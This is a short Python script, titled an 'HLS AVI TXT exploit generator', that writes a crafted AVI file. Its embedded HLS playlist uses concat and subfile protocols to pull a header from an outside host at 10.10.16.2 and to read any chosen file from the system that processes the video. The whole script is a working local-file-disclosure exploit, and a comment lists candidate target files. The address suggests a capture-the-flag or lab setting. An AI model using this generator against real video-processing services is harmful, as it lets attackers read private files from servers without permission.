import struct
import argparse

AVI_HEADER = b"RIFF\x00\x00\x00\x00AVI LIST\x14\x01\x00\x00hdrlavih8\x00\x00\x00@\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00}\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LISTt\x00\x00\x00strlstrh8\x00\x00\x00txts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00}\x00\x00\x00\x86\x03\x00\x00\x10'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\xa0\x00strf(\x00\x00\x00(\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x01\x00\x18\x00XVID\x00H\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LIST    movi"


def make_txt_packet(content, fake_packets=50, fake_packet_len=200):
    content = b'GAB2\x00\x02\x00' + b'\x00' * 10 + content
    packet = b'00tx' + struct.pack('<I', len(content)) + content
    dcpkt = b'00dc' + struct.pack('<I', fake_packet_len) + b'\x00' * fake_packet_len
    return packet + dcpkt * fake_packets

TXT_PLAYLIST = """#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://10.10.16.2:8888/header.m3u8|subfile,,start,{start},end,10000,,:{file}
#EXT-X-ENDLIST"""

def prepare_txt_packet(target, start=1):
    return make_txt_packet(TXT_PLAYLIST.format(file=target, start=start).encode())

# TXT_LIST = ['/usr/share/doc/gnupg/Upgrading_From_PGP.txt', '/usr/share/doc/mount/mount.txt', '/etc/pki/nssdb/pkcs11.txt', '/usr/share/gnupg/help.txt']

if __name__ == "__main__":
    parser = argparse.ArgumentParser('HLS AVI TXT exploit generator')
    parser.add_argument('target', help='any file that exist on target system')
    parser.add_argument('output', help='where to save the avi')
    parser.add_argument('--start', help='position in the target file, in byte count', default='1')
    args = parser.parse_args()

    with open(args.output, 'wb') as f:
        f.write(AVI_HEADER + prepare_txt_packet(args.target, args.start))

